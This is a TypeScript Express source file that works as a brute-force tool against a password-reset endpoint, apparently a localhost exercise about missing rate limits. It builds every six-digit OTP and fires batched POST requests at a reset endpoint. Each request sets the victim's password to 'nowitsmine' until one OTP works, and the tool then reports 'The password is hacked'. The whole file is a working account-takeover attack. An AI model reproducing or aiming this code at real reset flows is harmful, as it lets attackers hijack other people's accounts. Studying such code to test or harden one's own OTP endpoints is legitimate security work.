import express from "express";
import axios from "axios";

const app = express();
app.use(express.json());

let possibleOtps = new Set<number>();
let response: number | null = null;

async function generateOtps() {
  for (let i = 100000; i <= 999999; i++) {
    possibleOtps.add(i);
  }
  return "otp generated";
}

app.get("/", async (req, res) => {
  const op: string = await generateOtps();
  return res.json({
    msg: op,
  });
});

async function sendRequest(email: string, otp: number, i: number) {
  try {
    const res = await axios.post("http://localhost:3000/reset-password", {
      email: email,
      newpassword: "nowitsmine",
      otp: otp.toString(),
    });
    if (res.status === 200) {
      response = 200;
    }
  } catch (error) {
    console.log(`${i} failed`);
  }
}

app.post("/attack", async (req, res) => {
  const email = req.body.email;
  response = null;

  const promises = [];
  for (let i = 0; i < possibleOtps.size; i += 100) {
    const chunk = Array.from(possibleOtps).slice(i, i + 100);
    for (const otp of chunk) {
      promises.push(sendRequest(email, otp, i));
    }
    await Promise.all(promises);
    promises.length = 0;
    if(response === 200){
        break;
    }
  }

  if (response === 200) {
    return res.json({
      msg: "The password is hacked",
    });
  } else {
    return res.json({
      msg: "Unable to hack password",
    });
  }
});

app.listen(3001);